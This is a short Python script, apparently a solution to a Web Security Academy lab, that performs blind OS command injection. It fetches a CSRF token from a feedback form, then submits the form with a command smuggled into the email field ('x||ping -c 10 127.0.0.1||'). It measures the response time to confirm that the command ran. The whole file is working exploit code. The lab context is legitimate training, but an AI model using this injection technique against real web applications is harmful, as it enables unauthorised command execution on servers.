import requests
import bs4
import urllib.parse

DOMAIN = "0ac000020379260081cd5d1200c600b8.web-security-academy.net"

def get_csrf_token():
    response = requests.get(f"https://{DOMAIN}/feedback")
    soup = bs4.BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"}).get("value")

    return response.cookies["session"], csrf_token

def submit_feedback():
    session, csrf_token = get_csrf_token()
    response = requests.post(
        f"https://{DOMAIN}/feedback/submit",
        cookies={"session": session},
        data={
            "csrf": csrf_token,
            "name": "nozi",
            "email": "x||ping -c 10 127.0.0.1||",
            "subject": "nozi",
            "message": "nozi"
        }
    )
    print(f"Time elapsed: {response.elapsed.total_seconds()}")
    print(response.text)

submit_feedback() 


